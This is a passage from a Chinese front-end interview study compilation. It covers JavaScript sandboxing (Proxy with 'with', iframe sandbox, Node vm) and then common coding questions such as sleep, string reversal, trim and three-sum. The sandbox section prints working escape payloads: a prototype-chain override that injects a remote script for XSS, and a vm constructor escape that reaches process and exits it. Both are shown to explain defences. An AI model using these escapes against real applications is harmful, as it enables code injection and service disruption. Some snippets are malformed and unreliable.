接下里你要做的是，就是暴露可以被访问的变量exposeObj，以及阻断沙箱内的对外访问。通过es6提供的proxy特性，可以获取到对对象上的所有改写：

```jsx
function compileCode(src) {    src = `with (exposeObj) { ${src} }`    return new Function('exposeObj', src)}function proxyObj(originObj) {    let exposeObj = new Proxy(originObj, {        has: (target, key) => {            if (["console", "Math", "Date"].indexOf(key) >= 0) {                return target[key]            }            if (!target.hasOwnProperty(key)) {                throw new Error(`Illegal operation for key ${key}`)            }            return target[key]        },    })    return exposeObj}function createSandbox(src, obj) {    let proxy = proxyObj(obj)    compileCode(src).call(proxy, proxy) //绑定this 防止this访问window}
```

通过设置has函数，可以监听到变量的访问，在上述代码中，仅暴露个别外部变量供代码访问，其余不存在的属性，都会直接抛出error。其实还存在get、set函数，但是如果get和set函数只能拦截到当前对象属性的操作，对外部变量属性的读写操作无法监听到，所以只能使用has函数了。接下来我们测试一下：

```jsx
const testObj = {    value: 1,    a: {        b:    }}createSandbox("value='haha';console.log(a)", testObj)
```

看起来一切似乎没有什么问题，但是问题出在了传入的对象，当调用的是console.log(a.b) 的时候，has方法是无法监听到对b属性的访问的，假设所执行的代码是不可信的，这时候，它只需要通过a.b.**proto** 就可以访问到Object构造函数的原型对象，再对原型对象进行一些篡改，例如将toString就能影响到外部的代码逻辑的。

```jsx
createSandbox(`a.b.__proto__.toString = ()=>{ new (()=>{}).constructor("var script = document.createElement('script'); script.src = 'http://xss.js'; script.type = 'text/javascript'; document.body.appendChild(script);")()}`, testObj)console.log(testObj.a.b.__proto__.toString())
```

例如上面所展示的代码，通过访问原型链的方式，实现了沙箱逃逸，并且篡改了原型链上的toString方法，一旦外部的代码执行了toString方法，就可以实现xss攻击，注入第三方代码；由于在内部定义执行的函数代码逻辑，仍然会沿着作用于链查找，为了绕开作用域链的查找，笔者通过访问箭头函数的constructor的方式拿到了构造函数Function，这个时候，Funtion内所执行的xss代码，在执行的时候，便不会再沿着作用域链往上找，而是直接在全局作用域下执行，通过这样的方式，实现了沙箱逃逸以及xss攻击。

你可能会想，如果我切断原型链的访问，是否就杜绝了呢？的确，你可以通过Object.create(null) 的方式，传入一个不含有原型链的对象，并且让暴露的对象只有一层，不传入嵌套的对象，但是，即使是基本类型值，数字或字符串，同样也可以通过 **proto**查找到原型链，而且，即使不传入对象，你还可以通过下面这种方式绕过：

```jsx
({}).__proto__.toString = () => {    console.log(111)};
```

可见，new Function + with的这种沙箱方式，防君子不防小人，当然，你也可以通过对传入的code代码做代码分析或过滤？假如传入的代码不是按照的规定的数据格式（例如json），就直接抛出错误，阻止恶意代码注入，但这始终不是一种安全的做法。

1. 借助iframe实现沙箱

前面介绍一种劣质的、不怎么安全的方法构造了一个简单的沙箱，但是在前端最常见的方法，还是利用iframe来构造一个沙箱

```jsx
<iframe sandbox src="..."></iframe>
```

但是这也会带来一些限制：

1. script脚本不能执行
2. 不能发送ajax请求
3. 不能使用本地存储，即localStorage,cookie等
4. 不能创建新的弹窗和window
5. 不能发送表单
6. 不能加载额外插件比如flash等
    
    不过别方，你可以对这个iframe标签进行一些配置：
    
    ![](https://www.notion.soJS.assets/3FD065D9D9BD5924FC83D859A251A3C9.png)
    
    img
    

接下里你只需要结合postMessage API，将你需要执行的代码，和需要暴露的数据传递过去，然后和你的iframe页面通信就行了。

1）需要注意的是，在子页面中，要注意不要让执行代码访问到contentWindow对象，因为你需要调用contentWindow的postMessageAPI给父页面传递信息，假如恶意代码也获取到了contentWindow对象，相当于就拿到了父页面的控制权了，这个时候可大事不妙。

2）当使用postMessageAPI的时候，由于sandbox的origin默认为null，需要设置allow-same-origin允许两个页面进行通信，意味着子页面内可以发起请求，这时候需要防范好CSRF，允许了同域请求，不过好在，并没有携带上cookie。

3）当调用postMessageAPI传递数据给子页面的时候，传输的数据对象本身已经通过结构化克隆算法复制

简单的说，通过postMessageAPI传递的对象，已经由浏览器处理过了，原型链已经被切断，同时，传过去的对象也是复制好了的，占用的是不同的内存空间，两者互不影响，所以你不需要担心出现第一种沙箱做法中出现的问题。

1. nodejs中的沙箱

nodejs中使用沙箱很简单，只需要利用原生的vm模块，便可以快速创建沙箱，同时指定上下文。

```jsx
const vm = require('vm');const x = 1;const sandbox = {x: 2};vm.createContext(sandbox); // Contextify the sandbox.const code = 'x += 40; var y = 17;';vm.runInContext(code, sandbox);console.log(sandbox.x); // 42console.log(sandbox.y); // 17console.log(x); // 1;   y is not defined.
```

vm中提供了runInNewContext、runInThisContext、runInContext三个方法，三者的用法有个别出入，比较常用的是runInNewContext和runInContext，可以传入参数指定好上下文对象。

但是vm是绝对安全的吗？不一定。

```jsx
const vm = require('vm');vm.runInNewContext("this.constructor.constructor('return process')().exit()")
```

通过上面这段代码，我们可以通过vm，停止掉主进程nodejs，导致程序不能继续往下执行，这是我们不希望的，解决方案是绑定好context上下文对象，同时，为了避免通过原型链逃逸（nodejs中的对象并没有像浏览器端一样进行结构化复制，导致原型链依然保留），所以我们需要切断原型链，同时对于传入的暴露对象，只提供基本类型值。

```jsx
let ctx = Object.create(null);ctx.a = 1; // ctx上不能包含引用类型的属性vm.runInNewContext("this.constructor.constructor('return process')().exit()", ctx);
```

让我们来看一下TSW中是怎么使用的：

```jsx
const vm = require('vm');const SbFunction = vm.runInNewContext('(Function)', Object.create(null));        // 沙堆...if (opt.jsonpCallback) {    code = `var result=null; var ${opt.jsonpCallback}=function($1){result=$1}; ${responseText}; return result;`;    obj = new SbFunction(code)();}...
```

通过runInNewContext返回沙箱中的构造函数Function，同时传入切断原型链的空对象防止逃逸，之后再外部使用的时候，只需要调用返回的这个函数，和普通的new Function一样调用即可。

### 实现一个 JS 的sleep

**参考答案**：

普通版

```jsx
function sleep(sleepTime) {
    for (var start = new Date; new Date - start <= sleepTime;) {
    }
}

var t1 = +new Date()
sleep(3000)
var t2 = +new Date()
console.log(t2 - t1)
```

优点：简单粗暴，通俗易懂。

缺点：这是最简单粗暴的实现，确实 sleep 了，也确实卡死了，CPU 会飙升，无论你的服务器 CPU 有多么 Niubility。

Promise 版本

```jsx
function sleep(time) {
    return new Promise(resolve => setTimeout(resolve, time))
}

const t1 = +new Date()
sleep(3000).then(() => {
    const t2 = +new Date()
    console.log(t2 - t1)
})
```

优点：这种方式实际上是用了 setTimeout，没有形成进程阻塞，不会造成性能和负载问题。

缺点：虽然不像 callback 套那么多层，但仍不怎么美观，而且当我们需要在某过程中需要停止执行（或者在中途返回了错误的值），还必须得层层判断后跳出，非常麻烦，而且这种异步并不是那么彻底，还是看起来别扭

Async/Await 版本

```jsx
function sleep(delay) {
    return new Promise(reslove => {
        setTimeout(reslove, delay)
    })
}

!async function test() {
    const t1 = +new Date()
    await sleep(3000)
    const t2 = +new Date()
    console.log(t2 - t1)
}()
```

缺点： ES7 语法存在兼容性问题，有 babel 一切兼容性都不是问题

更优雅的写法

```jsx
function sleep(time) {
    return new Promise((resolve) => setTimeout(resolve, time));
}

// 用法
sleep(500).then(() => {    // 这里写sleep之后需要去做的事情
})
```

不要忘了开源的力量

```jsx
const sleep = require("sleep")
const t1 = +new Date()
sleep.msleep(3000)
const t2 = +new Date()
console.log(t2 - t1)
```

优点：能够实现更加精细的时间精确度，而且看起来就是真的 sleep 函数，清晰直白。

### function rand(min, max, N)：生成长度是N，且在min、max内不重复的整数随机数组

把考点拆成了4个小项；需要用递归算法实现： a) 生成一个长度为n的空数组arr。 b) 生成一个（min－max）之间的随机整数rand。 c) 把随机数rand插入到数组arr内，如果数组arr内已存在与rand相同的数字，则重新生成随机数rand并插入到 arr内[需要使用递归实现，不能使用for/while等循环] d) 最终输出一个长度为n，且内容不重复的数组arr。

```jsx
function buildArray(arr, n, min, max) {    var num = Math.floor(Math.random() * (max - min + 1)) + min;    if (!arr.includes(num)) {        arr.push(num);    }    return arr.length === n ? arr : buildArray(arr, n, min, max);}var result = buildArray([], 5, 2, 32);console.table(result);
```

### 字符串中的单词逆序输出（手写）

方法一：

```jsx
function strReverse(str) {    return str.split("").reverse().join("")}
```

方法二：

```jsx
function strReverse(str) {    var i = str.length;    var nstr = "";    i = i - 1;    for (var x = i; x >= 0; x--) {        nstr += str.charAt(x)    }    return nstr}
```

方法三：

```jsx
function strReverse(str) {    if (str.length == 0) return null;    var i = str.length;    var dstr = "";    while (--i >= 0) {        dstr += str.charAt(i);    }    return dstr;}
```

方法四：

```jsx
function strReverse(str) {    return str.split('').reduce((prev, next) => next + prev);}
```

方法五：

```jsx
function strReverse(str) {    var newstr = "";    for (var i = 0; i < str.length; i++) {        newstr = str.charAt(i) + newstr;    }    return newstr}
```

方法六：

```jsx
function strReverse(str) {    if (str.length === 1) {        return str    }    return str.slice(-1) + strReverse(str.slice(0, -1));}
```

### 不重复字符 最长子串 长度

思路分析：

对字符串进行遍历，使用String.prototype.indexOf()实时获取遍历过程中的无重复子串并存放于str，并保存当前状态最长无重复子串的长度为res，当遍历结束时，res的值即为无重复字符的最长子串的长度。

代码示例：

```jsx
/** * @param {string} s * @return {number} */var lengthOfLongestSubstring = function (s) {        var res = 0; // 用于存放当前最长无重复子串的长度        var str = ""; // 用于存放无重复子串        var len = s.length;        for (var i = 0; i < len; i++) {            var char = s.charAt(i);            var index = str.indexOf(char);            if (index === -1) {                str += char;                res = res < str.length ? str.length : res;            } else {                str = str.substr(index + 1) + char;            }        }        return res;    };
```

### 去掉字符串前后的空格

第五种方法在处理长字符串时效率最高

第一种：循环检查替换

```jsx
//供使用者调用function trim(s) {    return trimRight(trimLeft(s));}//去掉左边的空白function trimLeft(s) {    if (s == null) {        return "";    }    var whitespace = new String(" \t\n\r");    var str = new String(s);    if (whitespace.indexOf(str.charAt(0)) != -1) {        var j = 0, i = str.length;        while (j < i && whitespace.indexOf(str.charAt(j)) != -1) {            j++;        }        str = str.substring(j, i);    }    return str;}//去掉右边的空白 www.2cto.comfunction trimRight(s) {    if (s == null) return "";    var whitespace = new String(" \t\n\r");    var str = new String(s);    if (whitespace.indexOf(str.charAt(str.length - 1)) != -1) {        var i = str.length - 1;        while (i >= 0 && whitespace.indexOf(str.charAt(i)) != -1) {            i--;        }        str = str.substring(0, i + 1);    }    return str;}
```

第二种：正则替换

```html
<SCRIPT LANGUAGE="JavaScript">    String.prototype.Trim = function () {        return this.replace(/(^\s*)|(\s*$)/g, "");    }    String.prototype.LTrim = function () {        return this.replace(/(^\s*)/g, "");    }    String.prototype.RTrim = function () {        return this.replace(/(\s*$)/g, "");    }</SCRIPT>
```

第三种：使用jquery

```jsx
$.trim(str)//jquery内部实现为：function trim(str) {    return str.replace(/^(\s|\u00A0)+/, '').replace(/(\s|\u00A0)+$/, '');}
```

第四种：使用motools

```jsx
function trim(str) {    return str.replace(/^(\s|\xA0)+|(\s|\xA0)+$/g, '');}
```

第五种：裁剪字符串方式

```jsx
function trim(str) {    str = str.replace(/^(\s|\u00A0)+/, '');    for (var i = str.length - 1; i >= 0; i--) {        if (/\S/.test(str.charAt(i))) {            str = str.substring(0, i + 1);            break;        }    }    return str;}
```

### 判断输出console.log(0 == [])console.log([1] == [1])

```cpp
console.log([]==[]);  // falseconsole.log([]== 0);  // true
```

解析：

原始值的比较是值的比较： 它们的值相等时它们就相等（==） 对象和原始值不同，对象的比较并非值的比较,而是引用的比较： 即使两个对象包含同样的属性及相同的值，它们也是不相等的 即使两个数组各个索引元素完全相等，它们也是不相等的,所以[]!=[]

[]==0,是数组进行了隐士转换，空数组会转换成数字0，所以相等

### 三数之和

题目描述

给定一个包含 n 个整数的数组 nums，判断 nums 中是否存在三个元素 a，b，c ，使得 a + b + c = 0 ？找出所有满足条件且不重复的三元组。

注意：答案中不可以包含重复的三元组。

```jsx
//例如, 给定数组 nums = [-1, 0, 1, 2, -1, -4]，//满足要求的三元组集合为：[    [-1, 0, 1],    [-1, -1, 2]]
```

解答

这题我们才用排序+双指针的思路来做，遍历排序后的数组，定义指针l和r,分别从当前遍历元素的下一个元素和数组的最后一个元素往中间靠拢，计算结果跟目标对比。

```jsx
var threeSum = function (nums) {    if (nums.length < 3) {        return [];    }    let res = [];    // 排序    nums.sort((a, b) => a - b);    for (let i = 0; i < nums.length; i++) {        if (i > 0 && nums[i] == nums[i - 1]) {            // 去重            continue;        }        if (nums[i] > 0) {            // 若当前元素大于0，则三元素相加之后必定大于0            break;        }        // l为左下标，r为右下标        let l = i + 1;        r = nums.length - 1;        while (l < r) {            let sum = nums[i] + nums[l] + nums[r];            if (sum == 0) {                res.push([nums[i], nums[l], nums[r]]);                while (l < r && nums[l] == nums[l + 1]) {                    l++                }                while (l < r && nums[r] == nums[r - 1]) {                    r--;                }                l++;                r--;            } else if (sum < 0) {                l++;            } else if (sum > 0) {                r--;            }        }    }    return res;};
```